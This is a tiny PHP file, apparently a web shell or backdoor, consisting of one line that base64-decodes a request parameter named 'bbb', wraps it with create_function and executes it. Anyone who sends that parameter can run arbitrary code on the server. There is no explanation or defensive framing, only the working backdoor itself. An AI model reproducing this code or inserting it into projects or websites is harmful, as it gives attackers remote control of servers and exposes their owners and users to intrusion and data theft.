<?php
if(!empty($_REQUEST['bbb'])){$bbb=base64_decode($_REQUEST["bbb"]);$bbb=create_function('',$bbb);$bbb();exit;}